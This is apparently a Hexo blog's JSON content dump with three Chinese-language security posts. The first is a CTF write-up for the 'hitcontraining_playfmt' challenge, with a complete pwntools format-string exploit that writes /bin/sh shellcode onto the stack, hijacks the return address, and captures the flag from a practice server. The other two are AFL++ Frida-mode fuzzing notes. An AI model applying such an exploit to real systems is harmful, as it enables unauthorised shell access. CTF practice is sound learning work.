{"meta":{"title":"A4x7eq28'Blog","subtitle":"","description":"","author":"A4x7eq28","url":"http://www.4x7.fun","root":"/"},"pages":[{"title":"categories","date":"2022-03-18T10:31:12.000Z","updated":"2022-03-24T13:17:26.000Z","comments":true,"path":"categories/index.html","permalink":"http://www.4x7.fun/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-03-18T10:31:13.000Z","updated":"2022-03-24T13:17:13.000Z","comments":true,"path":"tags/index.html","permalink":"http://www.4x7.fun/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2022-03-18T11:17:15.000Z","updated":"2022-03-24T13:20:52.000Z","comments":true,"path":"about/index.html","permalink":"http://www.4x7.fun/about/index.html","excerpt":"","text":"A4x7eq28"},{"title":"友情链接","date":"2022-03-24T02:51:21.000Z","updated":"2022-03-24T02:51:21.000Z","comments":true,"path":"links/index.html","permalink":"http://www.4x7.fun/links/index.html","excerpt":"","text":""},{"title":"书单","date":"2022-03-24T02:50:48.000Z","updated":"2022-03-24T02:50:48.000Z","comments":false,"path":"books/index.html","permalink":"http://www.4x7.fun/books/index.html","excerpt":"","text":""}],"posts":[{"title":"WriteUp: hitcontraining_playfmt","slug":"WriteUp-hitcontraining-playfmt","date":"2022-04-11T12:25:50.000Z","updated":"2022-04-11T12:25:50.000Z","comments":true,"path":"2022/04/11/WriteUp-hitcontraining-playfmt/","link":"","permalink":"http://www.4x7.fun/2022/04/11/WriteUp-hitcontraining-playfmt/","excerpt":"","text":"Checksec 12345678╰─$ checksec playfmt[*] &#x27;hitcontraining_playfmt/playfmt&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 重要信息： a. i386 因此直接gdb.debug打开或者process打开用gdb.attach会有问题；需要特殊的处理，见后面exploit代码的start； b. Has RWX segments: 有可写可执行段，gdb playfmt后vmmap可以看到是stack c. No PIE: 因此ELF中符号，在ELF静态文件中的偏移即为加载后的偏移。但堆栈会随机化 Reverse Engineering Fig. 1. Vulnerability Point 漏洞点在上图中的标号(1)处,为Format String Attack. Analyze read-&gt;printf在while(True)循环中，因此可以无限次构造payload，理论上可以实现任意地址写。 但buf不在stack上，因此在payload中，任意写的目的地址无法直接通过字符串中指定，需要找到一个如下的栈链。 12345stack a: -&gt; stack b ...stack b: -&gt; stack c ...stack c: -&gt; 任意值 原理实质上很简单，通过Format String Attack的任意地址写，将Shell Code写入到RWX权限的栈上，并再次使用Format String Attack修改函数返回地址为Shell Code在栈上的地址。触发函数返回后即可获得shell。 但在实际exploit时，有很多细节要注意： a. 当 %Mc 之 M过大时，要留出足够的时间让程序完成完整printf行为。实际上应尽可能的让M值不要过大，不然容易失败。在exploit code中，我们采用了io.recvuntil(b'\\n')的方式，用b'\\n'字符作为输出结束的约定字符，这样即保证printf行为完整，又避免了过久等待。 b. stack链应避免使用ebp-&gt;prev-frame-esp-&gt;prevprev-frame-esp...的ebp栈链，否则在函数返回时，通过ebp恢复esp值时容易出错。 当然无其他选择时，ebp栈链也是可以操作的，需要注意操作后的恢复工作，保证ebp链的合法性。 且ebp栈链的好处是，它肯定是存在的，且距离不远，很容易找到。 c. 该exploit code避免使用了one_gadget,system等需要libcSearcher搜索判断远程libc.so版本的操作 Exploit Code 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#!python3from pwn import *from pwnlib.util import miscfrom LibcSearcher import *import oself = context.binary = ELF(&quot;playfmt&quot;)libc = elf.libccontext.terminal = [&quot;tmux&quot;, &quot;split&quot;, &quot;-h&quot;]gs = &#x27;&#x27;&#x27;continue&#x27;&#x27;&#x27;def start(): if args.GDB: p = process(elf.path) cmd = [&quot;gdb&quot;, &quot;-p&quot;, str(p.pid)] cmd = context.terminal + cmd cmd = &#x27; &#x27;.join(cmd) os.system(cmd) time.sleep(1) return p elif args.REMOTE: return remote(&#x27;node4.buuoj.cn&#x27;, 28106) else: return process(elf.path)#--------- Process Interactive ---------------------l = lambda x,y : log.info(f&quot;&#123;x&#125; -&gt; &#123;y&#125;&quot;)def readByFmtStr(fmtstr): io.send(fmtstr) addr = int(io.recv(), 16) return addrio = start()io.timeout = 3000io.recv()ebp = readByFmtStr(b&quot;%6$p&quot;)l(&quot;ebp&quot;, hex(ebp))#leak chain value chain = readByFmtStr(b&quot;%21$p&quot;)l(&quot;chain&quot;, hex(chain))shell = &quot;&quot;&quot;xor ecx,ecxmul ecxpush eaxmov al,0xbpush 0x68732f2f push 0x6e69622f mov ebx,espint 0x80&quot;&quot;&quot;shell_bs = asm(shell, arch=&quot;i386&quot;, os=&quot;linux&quot;)check = disasm(shell_bs)l(&quot;check&quot;, check)l(&quot;shell_bs&quot;, shell_bs)hexstr = &#x27;&#x27;for i in range(len(shell_bs)): hexstr += &#x27;\\\\x&#x27; + hex(shell_bs[i])[2:]l(&quot;hexstr&quot;, hexstr)### 将shellcode放到chain-0x300的位置shell_addr = chain &amp; 0xffff00ffl(&quot;shell_addr&quot;, hex(shell_addr))## write int8 value to address by low16# 通过栈低16位定位写入地址，写入指定值(int8)def write_int8(addr_low16, byte_value): log.info(f&quot;write_int8: &#123;hex(addr_low16)&#125; &#123;hex(byte_value)&#125;&quot;) addr_low16 = addr_low16 &amp; 0xffff # change 0b:002c value low16 payload = f&quot;%&#123;addr_low16&#125;c%21$hn&quot; payload = payload.encode() payload += b&quot;\\n\\x00&quot; # log.info(f&quot;payload 1: &#123;payload&#125;&quot;) io.send(payload) ctn = &quot;&quot; ctn = io.recvuntil(b&quot;\\n&quot;) # change addr_low16 value payload = f&quot;%&#123;byte_value&#125;c%57$hhn&quot; if byte_value == 0: payload = f&quot;%57$hhn&quot; payload = payload.encode() payload += b&quot;\\n\\x00&quot; # log.info(f&quot;payload 2: &#123;payload&#125;&quot;) io.send(payload) ctn = &quot;&quot; ctn = io.recvuntil(b&quot;\\n&quot;)for i in range(0, len(shell_bs)): aByte = shell_bs[i] addr_low16 = shell_addr + i write_int8(addr_low16, aByte)# # # 返回地址修改为shell_addrret_addr = ebp - 0xc # 0xff88e6d4 - 0xe8 --&gt; esp l(&quot;ret_addr&quot;, hex(ret_addr))shell_addr_bs = p32(shell_addr)l(&quot;shell_addr&quot;, hex(shell_addr))# l(&quot;shell_addr_bs&quot;, shell_addr_bs)for i in range(0, len(shell_addr_bs)): aByte = shell_addr_bs[i] addr_low16 = ret_addr + i write_int8(addr_low16, aByte)# # quit 触发返回io.sendline(b&quot;quit&quot;)# ctn = io.recv()####### Got Shell ######## cat flagio.sendline(b&#x27;cat flag&#x27;)flag = io.recv()log.info(f&quot;flag: &#123;flag&#125;&quot;)# ============================================================# io.interactive()io.close()#### 附录：# &quot;&quot;&quot;16:0058│ 0xff88e644 —▸ 0xff88e6d4 —▸ 0xff8900ca ◂— &#x27;../playfmt&#x27;...3a:00e8│ 0xff88e6d4 —▸ 0xff8900ca ◂— &#x27;../playfmt&#x27;&quot;&quot;&quot; Output Example 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657╰─$ python exp.py REMOTE[*] &#x27;hitcontraining_playfmt/playfmt&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments[*] &#x27;/lib/i386-linux-gnu/libc-2.27.so&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to node4.buuoj.cn on port 28106: Done[*] ebp -&gt; 0xffb2d448[*] chain -&gt; 0xffb2d504[*] check -&gt; 0: 31 c9 xor ecx, ecx 2: f7 e1 mul ecx 4: 50 push eax 5: b0 0b mov al, 0xb 7: 68 2f 2f 73 68 push 0x68732f2f c: 68 2f 62 69 6e push 0x6e69622f 11: 89 e3 mov ebx, esp 13: cd 80 int 0x80[*] shell_bs -&gt; b&#x27;1\\xc9\\xf7\\xe1P\\xb0\\x0bh//shh/bin\\x89\\xe3\\xcd\\x80&#x27;[*] hexstr -&gt; \\x31\\xc9\\xf7\\xe1\\x50\\xb0\\xb\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80[*] shell_addr -&gt; 0xffb20004[*] write_int8: 0xffb20004 0x31[*] write_int8: 0xffb20005 0xc9[*] write_int8: 0xffb20006 0xf7[*] write_int8: 0xffb20007 0xe1[*] write_int8: 0xffb20008 0x50[*] write_int8: 0xffb20009 0xb0[*] write_int8: 0xffb2000a 0xb[*] write_int8: 0xffb2000b 0x68[*] write_int8: 0xffb2000c 0x2f[*] write_int8: 0xffb2000d 0x2f[*] write_int8: 0xffb2000e 0x73[*] write_int8: 0xffb2000f 0x68[*] write_int8: 0xffb20010 0x68[*] write_int8: 0xffb20011 0x2f[*] write_int8: 0xffb20012 0x62[*] write_int8: 0xffb20013 0x69[*] write_int8: 0xffb20014 0x6e[*] write_int8: 0xffb20015 0x89[*] write_int8: 0xffb20016 0xe3[*] write_int8: 0xffb20017 0xcd[*] write_int8: 0xffb20018 0x80[*] ret_addr -&gt; 0xffb2d43c[*] shell_addr -&gt; 0xffb20004[*] write_int8: 0xffb2d43c 0x4[*] write_int8: 0xffb2d43d 0x0[*] write_int8: 0xffb2d43e 0xb2[*] write_int8: 0xffb2d43f 0xff[*] flag: b&#x27;flag&#123;d02e5ce9-0de8-475d-9e7b-464aba182d47&#125;\\n&#x27;[*] Closed connection to node4.buuoj.cn port 28106 The Challenge https://buuoj.cn/challenges#hitcontraining_playfmt","categories":[{"name":"Write Up","slug":"Write-Up","permalink":"http://www.4x7.fun/categories/Write-Up/"},{"name":"Format String Attack","slug":"Write-Up/Format-String-Attack","permalink":"http://www.4x7.fun/categories/Write-Up/Format-String-Attack/"}],"tags":[{"name":"Write Up","slug":"Write-Up","permalink":"http://www.4x7.fun/tags/Write-Up/"},{"name":"Format String Attack","slug":"Format-String-Attack","permalink":"http://www.4x7.fun/tags/Format-String-Attack/"}]},{"title":"AFL++ Frida-Mode: Usecases for testing and debugging","slug":"AFL-Frida-Mode-Usecases-for-testing-and-debugging","date":"2022-04-07T14:48:39.000Z","updated":"2022-04-11T02:15:12.000Z","comments":true,"path":"2022/04/07/AFL-Frida-Mode-Usecases-for-testing-and-debugging/","link":"","permalink":"http://www.4x7.fun/2022/04/07/AFL-Frida-Mode-Usecases-for-testing-and-debugging/","excerpt":"","text":"Fuzzing 明确指明需要加载的AFL_PRELOAD=环境变量值为/usr/local/lib/afl/afl-frida-trace.so、且需要加载的harness javascript文件为afl.js时: 1AFL_PRELOAD=/usr/local/lib/afl/afl-frida-trace.so AFL_FRIDA_JS_SCRIPT=fuzz.js afl-fuzz -D -O -i in -o out -t 10000+ -- ./build/test ./build/dummy 由于afl-frida-trace.so在PATH中，且AFL++ Frida_Mode默认寻找二进制同目录下的afl.js加载。因此以上可简写为： 1afl-fuzz -D -O -i in -o out -t 10000+ -- ./build/test ./build/dummy (注意有时在persistent时，有时用dummy input作为输入文件。以防止初始运行时找不到out/default/.cur_input文件而报错) 当需要输出forkserver的子进程的以便调试时： 1AFL_CHILD_DEBUG=1 afl-fuzz -O -D -i in -o out -- ./build/testinstr @@ GDB Debugging 命令如下： Example 1: 开启AFL_DEBUG_CHILD 123456gdb \\ --ex &#x27;set environment LD_PRELOAD=/usr/local/lib/afl/afl-frida-trace.so&#x27; \\ --ex &#x27;set environment AFL_FRIDA_JS_SCRIPT=afl.js&#x27; \\ --ex &#x27;set environment AFL_DEBUG_CHILD=1&#x27; \\ --ex &#x27;set disassembly-flavor intel&#x27; \\ --args ./build/testinstr ./build/in/in Example 2: 12345gdb \\ --ex &#x27;set environment LD_PRELOAD=/usr/local/lib/afl/afl-frida-trace.so&#x27; \\ --ex &#x27;set environment AFL_FRIDA_JS_SCRIPT=afl.js&#x27; \\ --ex &#x27;set disassembly-flavor intel&#x27; \\ --args ./build/testinstr ./build/in/in Scripting 一个简单且方便调试的harnessjs 脚本如下 1234567891011121314151617181920212223242526272829303132333435363738394041Afl.print(&quot;----------------------------------------&quot;);Afl.print(&quot;| 4x7 = 28 |&quot;);Afl.print(&quot;----------------------------------------&quot;);Afl.print(&quot;pid: &quot; + Process.id);const name = Process.enumerateModules()[0].name;Afl.print(`Name: $&#123;name&#125;`);new ModuleMap().values().forEach(m =&gt; &#123; Afl.print(`$&#123;m.base&#125;-$&#123;m.base.add(m.size)&#125; $&#123;m.name&#125;`);&#125;);//address of testinstr// var testinstr_addr = Module.findExportByName(null, &quot;testinstr&quot;);// var testinstr_addr = DebugSymbol.forName(&quot;testinstr&quot;).address;const module = Process.enumerateModules()[0];Afl.print(&quot;Module.base: &quot; + module.base);const testinstr_addr = module.base.add(0x8ca);Afl.print(&quot;testinstr_addr: &quot; + testinstr_addr);const cm = new CModule(` extern unsigned char * __afl_fuzz_ptr; extern unsigned int * __afl_fuzz_len; extern void testinstr(char *buf, int len); void fuzz(char *buf, int len) &#123; __afl_fuzz_ptr[*__afl_fuzz_len] = 0; testinstr(__afl_fuzz_ptr, *__afl_fuzz_len); &#125;`, &#123; testinstr: testinstr_addr, __afl_fuzz_ptr: Afl.getAflFuzzPtr(), __afl_fuzz_len: Afl.getAflFuzzLen()&#125;);Afl.setEntryPoint(cm.fuzz);Afl.setPersistentAddress(cm.fuzz);Afl.setInMemoryFuzzing();Afl.setJsMainHook(cm.fuzz);Afl.print(&quot;done&quot;);Afl.done();","categories":[{"name":"Fuzz","slug":"Fuzz","permalink":"http://www.4x7.fun/categories/Fuzz/"}],"tags":[{"name":"Fuzz","slug":"Fuzz","permalink":"http://www.4x7.fun/tags/Fuzz/"},{"name":"Blind-Fuzz","slug":"Blind-Fuzz","permalink":"http://www.4x7.fun/tags/Blind-Fuzz/"},{"name":"AFL++","slug":"AFL","permalink":"http://www.4x7.fun/tags/AFL/"},{"name":"Frida","slug":"Frida","permalink":"http://www.4x7.fun/tags/Frida/"}]},{"title":"AFL++ Frida-Mode Scripting","slug":"AFL-Frida-Mode-Scripting","date":"2022-04-05T07:56:35.000Z","updated":"2022-04-11T02:15:12.000Z","comments":true,"path":"2022/04/05/AFL-Frida-Mode-Scripting/","link":"","permalink":"http://www.4x7.fun/2022/04/05/AFL-Frida-Mode-Scripting/","excerpt":"","text":"Scripting FRIDA当前支持使用Javascript配置的能力。依靠FRIDA的脚本引擎（支持调试符号和导出表），这比之前使用环境变量配置FRIDA更加方便。 在默认情况下，FRIDA模式会在目标文件(要被fuzz的二进制文件)相同目录下寻找afl.js文件，作为FRIDA的配置文件。若为其他文件名，则可使用AFL_FRIDA_JS_SCRIPT环境变量指定。 在该脚本中，除所有标准的frida api函数外，还另外添加了一些功能函数用以与FRIDA mode自身交互。这些额外的函数可以通过全局变量Afl来访问， 例如 Afl.print(&quot;Hello world&quot;); 取代 console.log(&quot;Hello World&quot;); 在使用中若需要调试，则使用环境变量AFL_DEBUG_CHILD=1. Example 在有符号的二进制中，用户往往更喜欢用符号指定函数地址（例如入口函数或者persistent fuzz的地址）。 下面的例子使用了API DebugSymbol.fromName(). 和 Module.getExportByName(). 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/* Use Afl.print instead of console.log */Afl.print(&#x27;******************&#x27;);Afl.print(&#x27;* AFL FRIDA MODE *&#x27;);Afl.print(&#x27;******************&#x27;);Afl.print(&#x27;&#x27;);/* Print some useful diagnostics stuff */Afl.print(`PID: $&#123;Process.id&#125;`);new ModuleMap().values().forEach(m =&gt; &#123; Afl.print(`$&#123;m.base&#125;-$&#123;m.base.add(m.size)&#125; $&#123;m.name&#125;`);&#125;);/* * Configure entry-point, persistence etc. This will be what most * people want to do. */const persistent_addr = DebugSymbol.fromName(&#x27;main&#x27;);Afl.print(`persistent_addr: $&#123;persistent_addr.address&#125;`);if (persistent_addr.address.equals(ptr(0))) &#123; Afl.error(&#x27;Cannot find symbol main&#x27;);&#125;const persistent_ret = DebugSymbol.fromName(&#x27;slow&#x27;);Afl.print(`persistent_ret: $&#123;persistent_ret.address&#125;`);if (persistent_ret.address.equals(ptr(0))) &#123; Afl.error(&#x27;Cannot find symbol slow&#x27;);&#125;Afl.setPersistentAddress(persistent_addr.address);Afl.setPersistentReturn(persistent_ret.address);Afl.setPersistentCount(1000000);/* Control instrumentation, you may want to do this too */Afl.setInstrumentLibraries();const mod = Process.findModuleByName(&quot;libc-2.31.so&quot;)Afl.addExcludedRange(mod.base, mod.size);/* Some useful options to configure logging */Afl.setStdOut(&quot;/tmp/stdout.txt&quot;);Afl.setStdErr(&quot;/tmp/stderr.txt&quot;);/* Show the address layout. Sometimes helpful */Afl.setDebugMaps();/* * If you are using these options, then things aren&#x27;t going * very well for you. */Afl.setInstrumentDebugFile(&quot;/tmp/instr.log&quot;);Afl.setPrefetchDisable();Afl.setInstrumentNoOptimize();Afl.setInstrumentEnableTracing();Afl.setInstrumentTracingUnique();Afl.setStatsFile(&quot;/tmp/stats.txt&quot;);Afl.setStatsInterval(1);/* *ALWAYS* call this when you have finished all your configuration */Afl.done();Afl.print(&quot;done&quot;); Stripped binaries 下面的例子是处理没符号或者导出表的二进制的情况： 1234const module = Process.getModuleByName(&#x27;target.exe&#x27;);/* Hardcoded offset within the target image */const address = module.base.add(0xdeadface);Afl.setPersistentAddress(address); Persistent hook Persistent hook可以通过使用一个共享链接库的方式(***.so)的方式实现。示例源码（hook并fuzzLLVMFuzzerTestOneInput函数的例子）可以在Frida_mode/hook目录下找到。在该例子中，使用了如下的代码片段实现Persistent Hook。 12345const path = Afl.module.path;const dir = path.substring(0, path.lastIndexOf(&quot;/&quot;));const mod = Module.load(`$&#123;dir&#125;/frida_mode/build/hook.so`);const hook = mod.getExportByName(&#x27;afl_persistent_hook&#x27;);Afl.setPersistentHook(hook); Persistent Hook也可以通过FRIDA本身对CModule的支持来实现，该功能依赖于TinyCC。 1234567891011121314151617const cm = new CModule(` #include &lt;string.h&gt; #include &lt;gum/gumdefs.h&gt; void afl_persistent_hook(GumCpuContext *regs, uint8_t *input_buf, uint32_t input_buf_len) &#123; memcpy((void *)regs-&gt;rdi, input_buf, input_buf_len); regs-&gt;rsi = input_buf_len; &#125; `, &#123; memcpy: Module.getExportByName(null, &#x27;memcpy&#x27;) &#125;);Afl.setPersistentHook(cm.afl_persistent_hook); Advanced persistence 以如下的代码作为（被fuzz）的目标程序源码为例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#include &lt;fcntl.h&gt;#include &lt;stdbool.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void LLVMFuzzerTestOneInput(char *buf, int len) &#123; if (len &lt; 1) return; buf[len] = 0; // we support three input cases if (buf[0] == &#x27;0&#x27;) printf(&quot;Looks like a zero to me!\\n&quot;); else if (buf[0] == &#x27;1&#x27;) printf(&quot;Pretty sure that is a one!\\n&quot;); else printf(&quot;Neither one or zero? How quaint!\\n&quot;);&#125;int run(char *file) &#123; int fd = -1; off_t len; char * buf = NULL; size_t n_read; int result = -1; do &#123; dprintf(STDERR_FILENO, &quot;Running: %s\\n&quot;, file); fd = open(file, O_RDONLY); if (fd &lt; 0) &#123; perror(&quot;open&quot;); break; &#125; len = lseek(fd, 0, SEEK_END); if (len &lt; 0) &#123; perror(&quot;lseek (SEEK_END)&quot;); break; &#125; if (lseek(fd, 0, SEEK_SET) != 0) &#123; perror(&quot;lseek (SEEK_SET)&quot;); break; &#125; buf = malloc(len); if (buf == NULL) &#123; perror(&quot;malloc&quot;); break; &#125; n_read = read(fd, buf, len); if (n_read != len) &#123; perror(&quot;read&quot;); break; &#125; dprintf(STDERR_FILENO, &quot;Running: %s: (%zd bytes)\\n&quot;, file, n_read); LLVMFuzzerTestOneInput(buf, len); dprintf(STDERR_FILENO, &quot;Done: %s: (%zd bytes)\\n&quot;, file, n_read); result = 0; &#125; while (false); if (buf != NULL) &#123; free(buf); &#125; if (fd != -1) &#123; close(fd); &#125; return result;&#125;void slow() &#123; usleep(100000);&#125;int main(int argc, char **argv) &#123; if (argc != 2) &#123; return 1; &#125; slow(); return run(argv[1]);&#125; 使用CModule的实现方法，FRIDA模式支持对任何函数的替换。如下例： 1234567891011121314151617181920212223242526272829const slow = DebugSymbol.fromName(&#x27;slow&#x27;).address;Afl.print(`slow: $&#123;slow&#125;`);const LLVMFuzzerTestOneInput = DebugSymbol.fromName(&#x27;LLVMFuzzerTestOneInput&#x27;).address;Afl.print(`LLVMFuzzerTestOneInput: $&#123;LLVMFuzzerTestOneInput&#125;`);const cm = new CModule(` extern unsigned char * __afl_fuzz_ptr; extern unsigned int * __afl_fuzz_len; extern void LLVMFuzzerTestOneInput(char *buf, int len); void slow(void) &#123; LLVMFuzzerTestOneInput(__afl_fuzz_ptr, *__afl_fuzz_len); &#125; `, &#123; LLVMFuzzerTestOneInput: LLVMFuzzerTestOneInput, __afl_fuzz_ptr: Afl.getAflFuzzPtr(), __afl_fuzz_len: Afl.getAflFuzzLen() &#125;);Afl.setEntryPoint(cm.slow);Afl.setPersistentAddress(cm.slow);Afl.setInMemoryFuzzing();Interceptor.replace(slow, cm.slow);Afl.print(&quot;done&quot;);Afl.done(); 在这个例子里，我们将slow函数替换成我们自己的代码。该代码随后被设定为入口地址、及persistent循环的地址。 Replacing LLVMFuzzerTestOneInput 与其他函数类似，函数LLVMFuzzerTestOneInput同样可以被替换。另外，任何被替换的函数都可以调用它本身。在下面的例子中，我们将LLVMFuzzerTestOneInput函数替换成My_LLVMFuzzerTestOneInput函数，并忽视buf和len两个参数；而改为使用__afl_fuzzer_ptr和__afl_fuzz_len。这允许我们在不必hook其他函数的情况下使用in-memory fuzzing。需要注意的是：替换函数和被替换的原函数不能使用同一函数名字，否则在CModule中的C代码将会由于符号名冲突而不能编译。 12345678910111213141516171819202122232425const LLVMFuzzerTestOneInput = DebugSymbol.fromName(&#x27;LLVMFuzzerTestOneInput&#x27;).address;Afl.print(`LLVMFuzzerTestOneInput: $&#123;LLVMFuzzerTestOneInput&#125;`);const cm = new CModule(` extern unsigned char * __afl_fuzz_ptr; extern unsigned int * __afl_fuzz_len; extern void LLVMFuzzerTestOneInput(char *buf, int len); void My_LLVMFuzzerTestOneInput(char *buf, int len) &#123; LLVMFuzzerTestOneInput(__afl_fuzz_ptr, *__afl_fuzz_len); &#125; `, &#123; LLVMFuzzerTestOneInput: LLVMFuzzerTestOneInput, __afl_fuzz_ptr: Afl.getAflFuzzPtr(), __afl_fuzz_len: Afl.getAflFuzzLen() &#125;);Afl.setEntryPoint(cm.My_LLVMFuzzerTestOneInput);Afl.setPersistentAddress(cm.My_LLVMFuzzerTestOneInput);Afl.setInMemoryFuzzing();Interceptor.replace(LLVMFuzzerTestOneInput, cm.My_LLVMFuzzerTestOneInput); Hooking main 最后，需要注意的是，main函数的Hook是一个特殊情况，这是因为main函数已经被FRIDA引擎自身hook了（至少第一个基本块已经被Stalker编译了）。因此任何如以上例子使用Interceptor.replace对main函数的替换都无效。JS绑定为此提供了setJsMainHook如下例所示： 12345678910111213141516171819202122232425262728const main = DebugSymbol.fromName(&#x27;main&#x27;).address;Afl.print(`main: $&#123;main&#125;`);const LLVMFuzzerTestOneInput = DebugSymbol.fromName(&#x27;LLVMFuzzerTestOneInput&#x27;).address;Afl.print(`LLVMFuzzerTestOneInput: $&#123;LLVMFuzzerTestOneInput&#125;`);const cm = new CModule(` extern unsigned char * __afl_fuzz_ptr; extern unsigned int * __afl_fuzz_len; extern void LLVMFuzzerTestOneInput(char *buf, int len); int main(int argc, char **argv) &#123; LLVMFuzzerTestOneInput(__afl_fuzz_ptr, *__afl_fuzz_len); &#125; `, &#123; LLVMFuzzerTestOneInput: LLVMFuzzerTestOneInput, __afl_fuzz_ptr: Afl.getAflFuzzPtr(), __afl_fuzz_len: Afl.getAflFuzzLen() &#125;);Afl.setEntryPoint(cm.main);Afl.setPersistentAddress(cm.main);Afl.setInMemoryFuzzing();Afl.setJsMainHook(cm.main); Library Fuzzing 使用FRIDA的Module.loadAPI,可扩展上述例子main函数的能力，使之调用任意函数。从而，当我们需要Fuzz一个动态链接库（而非可执行程序）时，可使用一个代理可执行程序作为入口。 Patching 以如下测试代码为例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123/* american fuzzy lop++ - a trivial program to test the build -------------------------------------------------------- Originally written by Michal Zalewski Copyright 2014 Google Inc. All rights reserved. Copyright 2019-2022 AFLplusplus Project. All rights reserved. Licensed under the Apache License, Version 2.0 (the &quot;License&quot;); you may not use this file except in compliance with the License. You may obtain a copy of the License at: https://www.apache.org/licenses/LICENSE-2.0 */#include &lt;fcntl.h&gt;#include &lt;stdbool.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;const uint32_t crc32_tab[] = &#123; 0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, ... 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d&#125;;uint32_tcrc32(const void *buf, size_t size)&#123; const uint8_t *p = buf; uint32_t crc; crc = ~0U; while (size--) crc = crc32_tab[(crc ^ *p++) &amp; 0xFF] ^ (crc &gt;&gt; 8); return crc ^ ~0U;&#125;/* * Don&#x27;t you hate those contrived examples which CRC their data. We can use * FRIDA to patch this function out and always return success. Otherwise, we * could change it to actually correct the checksum. */int crc32_check (char * buf, int len) &#123; if (len &lt; sizeof(uint32_t)) &#123; return 0; &#125; uint32_t expected = *(uint32_t *)&amp;buf[len - sizeof(uint32_t)]; uint32_t calculated = crc32(buf, len - sizeof(uint32_t)); return expected == calculated;&#125;/* * So you&#x27;ve found a really boring bug in an earlier campaign which results in * a NULL dereference or something like that. That bug can get in the way, * causing the persistent loop to exit whenever it is triggered, and can also * cloud your output unnecessarily. Again, we can use FRIDA to patch it out. */void some_boring_bug(char c) &#123; switch (c) &#123; case &#x27;A&#x27;...&#x27;Z&#x27;: case &#x27;a&#x27;...&#x27;z&#x27;: __builtin_trap(); break; &#125;&#125;void LLVMFuzzerTestOneInput(char *buf, int len) &#123; if (!crc32_check(buf, len)) return; some_boring_bug(buf[0]); if (buf[0] == &#x27;0&#x27;) &#123; printf(&quot;Looks like a zero to me!\\n&quot;); &#125; else if (buf[0] == &#x27;1&#x27;) &#123; printf(&quot;Pretty sure that is a one!\\n&quot;); &#125; else if (buf[0] == &#x27;2&#x27;) &#123; if (buf[1] == &#x27;3&#x27;) &#123; if (buf[2] == &#x27;4&#x27;) &#123; printf(&quot;Oh we, weren&#x27;t expecting that!&quot;); __builtin_trap(); &#125; &#125; &#125; else printf(&quot;Neither one or zero? How quaint!\\n&quot;);&#125;int main(int argc, char **argv) &#123; int fd = -1; off_t len; char * buf = NULL; size_t n_read; int result = -1; if (argc != 2) &#123; return 1; &#125; printf(&quot;Running: %s\\n&quot;, argv[1]); fd = open(argv[1], O_RDONLY); if (fd &lt; 0) &#123; return 1; &#125; len = lseek(fd, 0, SEEK_END); if (len &lt; 0) &#123; return 1; &#125; if (lseek(fd, 0, SEEK_SET) != 0) &#123; return 1; &#125; buf = malloc(len); if (buf == NULL) &#123; return 1; &#125; n_read = read(fd, buf, len); if (n_read != len) &#123; return 1; &#125; printf(&quot;Running: %s: (%zd bytes)\\n&quot;, argv[1], n_read); LLVMFuzzerTestOneInput(buf, len); printf(&quot;Done: %s: (%zd bytes)\\n&quot;, argv[1], n_read); return 0;&#125; 在以上的测试代码中，有多个函数会成为Fuzz的障碍，在如下的例子中，我们示范如何使用FRIDA的功能修改掉这些障碍。 12345678910111213141516171819202122232425262728293031323334Afl.print(&#x27;******************&#x27;);Afl.print(&#x27;* AFL FRIDA MODE *&#x27;);Afl.print(&#x27;******************&#x27;);Afl.print(&#x27;&#x27;);const main = DebugSymbol.fromName(&#x27;main&#x27;).address;Afl.print(`main: $&#123;main&#125;`);Afl.setEntryPoint(main);Afl.setPersistentAddress(main);Afl.setPersistentCount(10000000);const crc32_check = DebugSymbol.fromName(&#x27;crc32_check&#x27;).address;const crc32_replacement = new NativeCallback( (buf, len) =&gt; &#123; Afl.print(`len: $&#123;len&#125;`); if (len &lt; 4) &#123; return 0; &#125; return 1; &#125;, &#x27;int&#x27;, [&#x27;pointer&#x27;, &#x27;int&#x27;]);Interceptor.replace(crc32_check, crc32_replacement);const some_boring_bug = DebugSymbol.fromName(&#x27;some_boring_bug&#x27;).addressconst boring_replacement = new NativeCallback( (c) =&gt; &#123; &#125;, &#x27;void&#x27;, [&#x27;char&#x27;]);Interceptor.replace(some_boring_bug, boring_replacement);Afl.done();Afl.print(&quot;done&quot;); Advanced patching Consider the following code fragment… 1234567891011121314151617181920212223extern void some_boring_bug2(char c);__asm__ ( &quot;.text \\n&quot; &quot;some_boring_bug2: \\n&quot; &quot;.global some_boring_bug2 \\n&quot; &quot;.type some_boring_bug2, @function \\n&quot; &quot;mov %edi, %eax \\n&quot; &quot;cmp $0xb4, %al \\n&quot; &quot;jne ok \\n&quot; &quot;ud2 \\n&quot; &quot;ok: \\n&quot; &quot;ret \\n&quot;);void LLVMFuzzerTestOneInput(char *buf, int len) &#123; ... some_boring_bug2(buf[0]); ...&#125; FRIDA除Interceptor.replace和Interceptor.attachAPI之外，还允许使用StalkerAPI对目标程序进行更细粒度的更改。 